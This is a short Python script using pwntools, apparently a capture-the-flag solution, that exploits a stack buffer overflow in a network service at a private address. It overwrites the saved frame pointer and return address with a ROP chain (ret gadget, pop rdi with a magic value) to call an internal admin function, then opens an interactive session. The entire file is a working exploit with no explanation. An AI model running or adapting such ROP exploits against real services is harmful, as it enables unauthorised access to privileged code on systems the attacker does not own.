#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

HOST = '10.34.9.91'
PORT = 10084

p = remote(HOST, PORT)

POP_RDI = 0x4011ec
RET = 0x401375
INTERNAL_ADMIN = 0x4011f1

payload  = b"\x01\x68\x00"                      # command=1, length=0x68=104
payload += b"A" * 64                            # padding buffer (64 byte)
payload += b"B" * 8                             # saved RBP
payload += p64(RET)                             # ret gadget (align stack)
payload += p64(POP_RDI)                         # pop rdi ; ret
payload += p64(0x1337c0de)                      # magic → RDI
payload += p64(INTERNAL_ADMIN)                  # internal_admin

p.send(payload)
p.interactive()
